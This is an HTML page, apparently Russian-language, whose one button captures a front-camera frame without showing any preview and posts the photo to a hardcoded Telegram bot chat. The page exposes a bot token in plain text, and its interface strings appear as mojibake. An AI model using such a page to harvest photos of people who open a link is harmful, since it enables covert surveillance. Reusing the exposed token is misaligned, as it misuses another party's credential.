<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Selfie ‚Üí Telegram</title>

<style>
html,body{
  margin:0;
  padding:0;
  width:100%;
  height:100%;
  background:#000;
  color:#0f0;
  font-family:Arial,sans-serif;
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
}
#status{
  margin-bottom:20px;
  text-align:center;
}
button{
  padding:15px 25px;
  font-size:16px;
  background:#0f0;
  border:none;
  border-radius:6px;
  cursor:pointer;
}
video{
  position:fixed;
  left:-9999px;
  width:1px;
  height:1px;
  opacity:0;
}
</style>
</head>

<body>

<div id="status">–ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É –¥–ª—è —Å–µ–ª—Ñ–∏</div>
<button id="btn">üì∏ –°–¥–µ–ª–∞—Ç—å —Å–µ–ª—Ñ–∏</button>

<script>
const BOT_TOKEN = '8415018467:AAFtfY3AnAOHvVMBK9zRj1BehN6uM2MC5e0';
const CHAT_ID = '1250741267';

const status = document.getElementById('status');
const btn = document.getElementById('btn');

function updateStatus(t){ status.textContent = t; }
function sleep(ms){ return new Promise(r=>setTimeout(r,ms)); }

btn.onclick = async () => {
  btn.disabled = true;
  let stream;

  try{
    updateStatus('1Ô∏è‚É£ –ó–∞–ø—Ä–∞—à–∏–≤–∞—é –∫–∞–º–µ—Ä—É‚Ä¶');

    stream = await navigator.mediaDevices.getUserMedia({
      video:{
        facingMode:'user',
        width:{ideal:1280},
        height:{ideal:720}
      },
      audio:false
    });

    const video = document.createElement('video');
    video.srcObject = stream;
    video.playsInline = true;
    video.muted = true;
    document.body.appendChild(video);

    await video.play();
    await sleep(800); // –û–ë–Ø–ó–ê–¢–ï–õ–¨–ù–û –¥–∞—ë–º –∫–∞–º–µ—Ä–µ –∫–∞–¥—Ä

    if(video.videoWidth === 0){
      throw new Error('–ö–∞–º–µ—Ä–∞ –Ω–µ –¥–∞–ª–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ');
    }

    updateStatus('2Ô∏è‚É£ –ó–∞—Ö–≤–∞—Ç—ã–≤–∞—é –∫–∞–¥—Ä‚Ä¶');

    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    const ctx = canvas.getContext('2d');

    // –∑–µ—Ä–∫–∞–ª–æ (—Å–µ–ª—Ñ–∏)
    ctx.translate(canvas.width,0);
    ctx.scale(-1,1);
    ctx.drawImage(video,0,0,canvas.width,canvas.height);
    ctx.setTransform(1,0,0,1,0,0);

    stream.getTracks().forEach(t=>t.stop());

    updateStatus('3Ô∏è‚É£ –ö–æ–¥–∏—Ä—É—é –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ‚Ä¶');

    // === –ù–ê–î–Å–ñ–ù–´–ô –°–ü–û–°–û–ë (–ë–ï–ó toBlob) ===
    const dataURL = canvas.toDataURL('image/jpeg',0.9);

    function dataURLtoBlob(dataurl){
      const arr = dataurl.split(',');
      const mime = arr[0].match(/:(.*?);/)[1];
      const bstr = atob(arr[1]);
      let n = bstr.length;
      const u8arr = new Uint8Array(n);
      while(n--) u8arr[n] = bstr.charCodeAt(n);
      return new Blob([u8arr],{type:mime});
    }

    const blob = dataURLtoBlob(dataURL);

    updateStatus('4Ô∏è‚É£ –û—Ç–ø—Ä–∞–≤–ª—è—é –≤ Telegram‚Ä¶');

    const formData = new FormData();
    formData.append('chat_id',CHAT_ID);
    formData.append('photo',blob,`selfie_${Date.now()}.jpg`);

    const res = await fetch(
      `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
      {method:'POST',body:formData}
    );

    const json = await res.json();

    if(json.ok){
      updateStatus('‚úÖ –§–æ—Ç–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ!');
    }else{
      updateStatus('‚ùå Telegram: '+json.description);
      console.error(json);
    }

  }catch(e){
    updateStatus('‚ùå –û—à–∏–±–∫–∞: '+e.message);
    console.error(e);
    if(stream) stream.getTracks().forEach(t=>t.stop());
  }
};
</script>
</body>
</html>
